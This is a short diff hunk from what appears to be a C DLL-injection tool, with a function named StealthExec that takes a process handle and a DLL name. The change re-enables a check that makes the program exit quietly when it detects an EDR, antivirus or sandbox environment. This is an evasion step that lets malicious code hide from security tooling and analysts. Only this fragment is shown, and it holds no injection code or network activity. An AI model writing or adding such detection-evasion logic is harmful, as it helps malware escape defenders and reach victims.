@@ -83,10 +83,10 @@ void StealthExec(HANDLE hProc, const char *dllN)
 int main(int argc, char *argv[])
 {
     // Check For EDR/AV/Sandbox env
-    // if (PerfomChecksEnv())
-    // {
-    //     return 0;
-    // }
+    if (PerfomChecksEnv())
+    {
+        return 0;
+    }
 
     // If no DLL given, abort.
     if (argc != 2)
